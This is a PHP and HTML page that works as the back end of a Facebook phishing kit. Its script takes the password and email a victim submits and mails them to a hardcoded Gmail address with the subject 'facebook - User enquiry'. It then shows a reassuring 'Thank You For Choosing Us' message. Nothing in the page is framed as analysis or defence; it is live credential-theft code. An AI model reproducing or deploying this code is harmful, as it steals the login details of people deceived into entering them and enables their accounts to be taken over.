<!DOCTYPE HTML>
<html lang="en">
<head>
	<meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

	<title>Anacker Loves You</title>
</head>

<body>
              <?php
    



		$pass = $_POST['pass'];
		$email = $_POST['email'];

            
if( $_SERVER["REQUEST_METHOD"]=="POST")
{
   

    
       
         
        $body = "A user $name filled the fb form: \n\n".
    "Password: $pass \n\n".
    "Email: $email \n\n".

$to = "subodhlucky6262@gmail.com";
$subject = "facebook - User enquiry";


mail($to,$subject,$body);}    
?>

        <div class="container-fluid logo" style="text-align: center;">
            <div>
                <img src="img/s_get-served.jpg" width="35%" />
            </div><br />
            <div>
                <div>
                    <p style="box-shadow:0px 0px 1px 1px grey;background-color: #318FD5;color: white; border-radius: 3px;padding: 0.8%;line-height: 1.7;"> Thank You For Choosing Us.<br />
                        <i class="fa fa-smile-o" aria-hidden="true"></i> <a href="enquire.php" style="color: #D8EAF3;">Click here</a> to return back.
                </div>
            </div>
        </div><br />
        
        
            
               
        <br /><br /><br />
        
        
        
        

</body>
</html>
